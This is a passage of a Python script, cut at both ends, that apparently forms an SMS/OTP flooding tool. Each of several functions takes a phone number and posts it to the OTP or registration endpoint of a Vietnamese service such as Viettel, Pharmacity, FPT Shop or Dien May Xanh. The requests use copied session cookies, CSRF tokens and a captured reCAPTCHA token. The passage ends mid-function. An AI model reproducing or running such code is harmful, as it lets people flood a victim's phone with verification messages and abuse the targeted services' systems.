    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def fb(phone):
    cookies = {
    'con.unl.lat': '1720112400',
    'con.unl.sc': '1',
    '_gid': 'GA1.3.2048602791.1720189695',
    '_tt_enable_cookie': '1',
    '_ttp': 'loSwVu_AC7yj50Md2HhAQPUajHo',
    '_clck': 'k364l7%7C2%7Cfn7%7C0%7C1647',
    '_fbp': 'fb.2.1720189698853.917828572155116943',
    '_hjSessionUser_1708983': 'eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
    '__zi': '3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1',
    '_gcl_au': '1.1.888803755.1720189704',
    'con.ses.id': '684bd57c-05df-40e6-8f09-cb91b12b83ee',
    '_cfuvid': '7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000',
    '_gat_UA-3729099-1': '1',
    '_hjSession_1708983': 'eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=',
    '_hjHasCachedUserAttributes': 'true',
    '__gads': 'ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg',
    '__gpi': 'UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ',
    '__eoi': 'ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu',
    'cf_clearance': 'CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A',
    'ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D',
    'ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad': '%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D',
    '_ga': 'GA1.3.697835917.1720189695',
    '_clsk': 'lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect',
    'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D',
    'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D',
    '_ga_HTS298453C': 'GS1.1.1720194528.2.1.1720194561.27.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    # 'cookie': 'con.unl.lat=1720112400; con.unl.sc=1; _gid=GA1.3.2048602791.1720189695; _tt_enable_cookie=1; _ttp=loSwVu_AC7yj50Md2HhAQPUajHo; _clck=k364l7%7C2%7Cfn7%7C0%7C1647; _fbp=fb.2.1720189698853.917828572155116943; _hjSessionUser_1708983=eyJpZCI6IjZiZjVlNGY3LTQyNWMtNWQ1ZC05NzkwLTViYjdiNDFiOWU2YSIsImNyZWF0ZWQiOjE3MjAxODk2OTYyMTEsImV4aXN0aW5nIjp0cnVlfQ==; __zi=3000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLincmF_oW0L0tINMkBs220wO8DswieL63fWYcRsrZaiEdJKvD0.1; _gcl_au=1.1.888803755.1720189704; con.ses.id=684bd57c-05df-40e6-8f09-cb91b12b83ee; _cfuvid=7yRCvrBIxINMnm4CnbUMRUZmWAccGH2dDs_qb59ESSo-1720194527813-0.0.1.1-604800000; _gat_UA-3729099-1=1; _hjSession_1708983=eyJpZCI6ImU5NzAwOTg4LWQzNDEtNGNhZS05ODNiLWU0ZmNjYzY1ZDA5YiIsImMiOjE3MjAxOTQ1MjkzMDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _hjHasCachedUserAttributes=true; __gads=ID=09882b169dabe671:T=1720189697:RT=1720194530:S=ALNI_MbAkhD6GtaqnGMyaNCNq8Pbsgmczg; __gpi=UID=00000e7482c26bd1:T=1720189697:RT=1720194530:S=ALNI_MbttJ_DnsgUfO4krJdd8LQMEqUzaQ; __eoi=ID=05eb7c1e80c4dfec:T=1720189697:RT=1720194530:S=AA-AfjZGyVTvphkMg_RLDUYt6ivu; cf_clearance=CsP84lMQsTJ_VGvVF8ePeTzWAOaQrHaccFefKS2LJBc-1720194531-1.0.1.1-AX158eVwvwGl4Xpy_HXebkwMMooSVw.6mi28sn_a5RQ.CWi9_fjgwiYoHW_Z8kRtauREt.mnyZ0dKqrGt4rE3A; ab.storage.sessionId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e2f1139a-b6ea-23ca-2c34-66f0afd8986a%22%2C%22e%22%3A1720196334327%2C%22c%22%3A1720194534327%2C%22l%22%3A1720194534327%7D; ab.storage.deviceId.892f88ed-1831-42b9-becb-90a189ce90ad=%7B%22g%22%3A%22e5723b5d-14a5-7f2b-c287-dc660f0d0fb2%22%2C%22c%22%3A1720189700567%2C%22l%22%3A1720194534332%7D; _ga=GA1.3.697835917.1720189695; _clsk=lxz3ig%7C1720194550598%7C2%7C0%7Cz.clarity.ms%2Fcollect; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%2285b2f8ad-7fdd-4ac6-8711-9a462c66ea19%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7580977Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d6716aa9-48a6-47dd-890c-aec43dacd542%22%2C%22expireDate%22%3A%222025-07-05T22%3A49%3A11.7581682Z%22%7D; _ga_HTS298453C=GS1.1.1720194528.2.1.1720194561.27.0.0',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'phoneNumber': phone,
}

    response = requests.get(
    'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
    params=params,
    cookies=cookies,
    headers=headers,
)

def dvcd(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

###
def myvt(phone):
    cookies = {
        'laravel_session': '5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF',
        '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1',
        'XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
         'Cookie': 'laravel_session=5FuyAsDCWgyuyu9vDq50Pb7GgEyWUdzg47NtEbQF; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eafoFxfZnrBmoB8-EoFKqp6BOB_wu5IGySqDpK.1; XSRF-TOKEN=eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

##

###

###
def phar(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/json',
    'origin': 'https://www.pharmacity.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.pharmacity.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-device-id': '940de2f9-82d3-4790-bd9f-23d7c957ac26',
    'x-device-platform': 'Chrome',
    'x-device-platform-version': '127.0.0.0',
}

   json_data = {
    'phone': phone,
    'recaptcha': '03AFcWeA7V0fF9KLysGE09G-0Fag-O2opS_ff94uTfPmlChemPUhczRQDN1uzlvQv0k4gIi_DYyje2EX-KU2DLoOOwZYAVkQfGxRdIiMGJJ5WVIy9vs3mWK98WQ1CM85O-Rruw6fEDVsAmh42f2go2zyzYCFyGpvzrBi-Ph6HeGBl2KglwSzPRR46PCTkDFCFzR1XQWEwKCQlBKIbeH0HVcZ3TEM-sJlKBm0lzianSCO748vzKkDrAWYob9efIjDD83QMGazsFhn4kswTDTP7fF8dv1ZQpsLZet-t7yQQR71ZTHcskX09bdAEgHy6Tl7GHpJY3vM7LqPXjPt1kzNTg0f3smeLHZq-ZfWLXdcSuTgoyAbFqq9HLuCAEqk3cN3bLtT2E0QGgDC6XEgvtZyLslfBFOtrctqexbrYz1G9l2ZS--TSOcHJ8d7GPHVNvZxQMHrgSwNhI17k15-qhwRo9JfOlK_VZsi2tI6QSjvfQC0PsKoPqOEGWQsb9x0K-bEQeTBMar3D7Dqvv38-I1N709sHl2WytBuaEmzIagoi2vmF6ou3HFG_uZBmwoFfJS35jivrqNSAHolpslFnfCSNNj0bNFfYSS6yifWFD_xoScBiBP9Dw5grTA0q0WwQV63pign1i2y7YaH0zDZvGgMQyb2tleAxbKwacHiDPgiGZwMpxRwbukt-FkbYkkLSbEnE1XNmrXlP9La5uvB06eVC9D6klEIbboVbeQC1tRol3GZ4GG0oZRRNFOsK3d4oFa4MHletOjrbpnZwgwg_r3fBrYNk13oive0EvUuWS52-5tl8kUUuhUP8mr49qC7v9sgG1cc9dRnfpLip_HZ8YuPLmZiXWb5PWh3EZeEmiEerszzqp47wNP8yVzrRWzW-Jt6yptAaXg1cRqTS3I_xGB0WAHq_0V91bXbvBT9YqiMKxIiVuuZkCMLkhp8nYHBAFP8jgS-ZNY38J3Ms3yDnI-is2OzqKi0iwY_Oaoq33kGZjdA7jHnBa7UUZfHWxLDp_WLBq5npUNs6hl8dNxKp6q53e1y7j-I16aQAcvVKtWAc6URmAGlYWr-C4Zpy00Cfz99QfmUCflVp8RnD5mI_fiMdLgaIfd-mWyJsz33sETslg9g45AsyGTdHWisqvMOPUYH-uHDfnGBU5MsgeMS-IzTTYVi3FNECy8fO10Skhx0DCgnpK_EZH7UhH-v5xBpdfgxBkXnMKPBvAquMi3gViTp6Nw0gezQvQ3yew14vScrmGmb4qKMXMh2-u-ynNLm-0XU64A_aLy7vd4VZz56oydZI3ddNmUZ-ea-cQgP-sY1fnhwkrg-nBdOVTlX8ZFPEuc65kNYacHoFg2Qnxffp0PUSDvLPuxVv84mMx10U4k0DqJOhOM8scg0JT4vyFDeYNT517uioCjdC4zYrJfDET7yxI5-6wiAzdIA3hb7MsJQCfoI5BWRqSyom7zjYdkbR1sZoZJdRHzYOX6UbR81DNp-yOI8gJIWyUYpxb_UEMFAit22Z1jFZxLx0vr-WecEuzXxkQn0_D8xRYks-UcMfWCy-c_HRTUkbBONbkNzscIubIgQhIpZLtcxYvA4UAHYv9OEpvgq76PXksjU_MSKx_a-FqUypF0704KhkSfkI7ryn0VyR2jys0e-VjmUkNCjVPka95pWhn5w_EqUHx4RXMj8au4IgiE9fvwPQgn_67J79b98jFe7xv2V7eDUXACv0EhGp5iWvH0JVhbwsjOb9GGXgniSdWEBC2CZv78-PtZtKKKflVbn13jY02oT6a4o6WOiV57lpnvFn6YA-EjnZHWElqwshVISKZqM1skHgl3UCryRPi8lefJDzAIq1L5QgjRpC7RvJbjOe0icqS_k3poH23GrUYWrA89e1_4yoHAaybjQT9znTEeaH9Fao',
    'version': 'v3',
    'voice': True,
    'method': 'sms',
}

   response = requests.post(
    'https://api-gateway.pharmacity.vn/pmc-ecm-auth-api/api/authenticator/customer/register/otp',
    headers=headers,
    json=json_data,
)
def mocha(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': phone,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)

##
def fptshop(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://fptshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fptshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'fromSys': 'WEBKHICT',
    'otpType': '0',
    'phoneNumber': phone,
}

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)

#####
###

####
def meta(phone):
    cookies = {
    '_ssid': 'vhs1wox2wourjpxsr55hygiu',
    '_cart_': '50568886-ac95-4d4b-b7e3-7819d23d7e44',
    '_gcl_au': '1.1.1853648441.1720104054',
    '__ckmid': '533492a097c04aa18d6dc2d81118d705',
    '_gid': 'GA1.2.95221250.1720104055',
    '_gat_UA-1035222-8': '1',
    '_ga': 'GA1.1.172471248.1720104055',
    '.mlc': 'eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=',
    '_clck': 'lpzudx%7C2%7Cfn6%7C0%7C1646',
    '_clsk': '1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect',
    '_ga_YE9QV6GZ0S': 'GS1.1.1720104062.1.1.1720104068.0.0.0',
    '_ga_L0FCVV58XQ': 'GS1.1.1720104056.1.1.1720104070.46.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_ssid=vhs1wox2wourjpxsr55hygiu; _cart_=50568886-ac95-4d4b-b7e3-7819d23d7e44; _gcl_au=1.1.1853648441.1720104054; __ckmid=533492a097c04aa18d6dc2d81118d705; _gid=GA1.2.95221250.1720104055; _gat_UA-1035222-8=1; _ga=GA1.1.172471248.1720104055; .mlc=eyJjaXR5IjoiQ+AgTWF1IiwiY291bnRyeSI6IlZOIn0=; _clck=lpzudx%7C2%7Cfn6%7C0%7C1646; _clsk=1j3awjd%7C1720104063602%7C1%7C1%7Cu.clarity.ms%2Fcollect; _ga_YE9QV6GZ0S=GS1.1.1720104062.1.1.1720104068.0.0.0; _ga_L0FCVV58XQ=GS1.1.1720104056.1.1.1720104070.46.0.0',
    'origin': 'https://meta.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://meta.vn/account/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    params = {
    'api_mode': '1',
}

    json_data = {
    'api_args': {
        'lgUser': phone,
        'type': 'phone',
    },
    'api_method': 'CheckRegister',
}

    response = requests.post(
    'https://meta.vn/app_scripts/pages/AccountReact.aspx',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)

###
def blu(phone):
    cookies = {
    'DMX_View': 'DESKTOP',
    'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
    '_gcl_au': '1.1.804133484.1690973397',
    '_gid': 'GA1.2.1071358409.1690973397',
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.8.8977': 'c624660949009f11.1690973398.',
    '_pk_ses.8.8977': '1',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
    'cebs': '1',
    '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
    '_fbp': 'fb.1.1690973400267.315266557',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
    'lhc_per': 'vid|c3330ef02699a3239f3d',
    '_gat_UA-38936689-1': '1',
    '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
    '_ga': 'GA1.1.1906131468.1690973397',
    'SvID': 'dmxcart2737|ZMo2n|ZMo01',
    'cebsp_': '2',
}

    headers = {
    'authority': 'www.dienmayxanh.com',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
    'origin': 'https://www.dienmayxanh.com',
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

  ###
def tgdt(phone):
    cookies = {
